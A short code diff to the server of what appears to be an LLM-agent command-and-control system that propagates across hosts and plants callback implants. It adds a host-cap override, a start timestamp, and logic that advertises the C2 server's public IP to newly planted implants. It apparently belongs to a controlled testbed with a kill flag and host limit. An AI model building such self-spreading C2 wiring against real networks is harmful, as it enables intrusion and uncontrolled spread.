@@ -37,9 +37,10 @@ with open("/configs/llm.yaml") as f:
     CONFIG = yaml.safe_load(f)
 
 run_id = str(uuid.uuid4())
+started_at = datetime.now(timezone.utc).isoformat()
 log.info("RUN_ID=%s", run_id)
 
-MAX_HOSTS: int = CONFIG.get("run", {}).get("max_hosts", 999)
+MAX_HOSTS: int = int(os.environ.get("MAX_HOSTS") or CONFIG.get("run", {}).get("max_hosts", 999))
 # Max LangGraph node executions per agent activation (agent + tool nodes each count as 1).
 # Caps runaway within-turn loops without needing a checkpointer.
 MAX_RECURSION: int = CONFIG.get("run", {}).get("max_recursion", 50)
@@ -59,6 +60,12 @@ try:
     _c2_ips = [ip for ip in _c2_ip_output.stdout.strip().split() if ip]
 except Exception:
     _c2_ips = []
+# C2_PUBLIC_IP is injected by `make deploy` from terraform output.
+# Prepend it so the agent always advertises the public address to newly planted DBAs —
+# hostname -I only returns private/anchor IPs; the public IP is NAT'd and invisible.
+_pub = os.environ.get("C2_PUBLIC_IP", "")
+if _pub and _pub not in _c2_ips:
+    _c2_ips.insert(0, _pub)
 world.notes["c2_ips"] = " ".join(_c2_ips) if _c2_ips else "unknown"
 log.info("C2 own IPs (never-target list): %s", _c2_ips)
 
@@ -433,6 +440,7 @@ def health():
         "status": "ok",
         "killed": killed,
         "run_id": run_id,
+        "started_at": started_at,
         "host_count": len(world.hosts),
         "propagation_complete": world.propagation_complete(MAX_HOSTS),
         "agent_notes": world.notes,
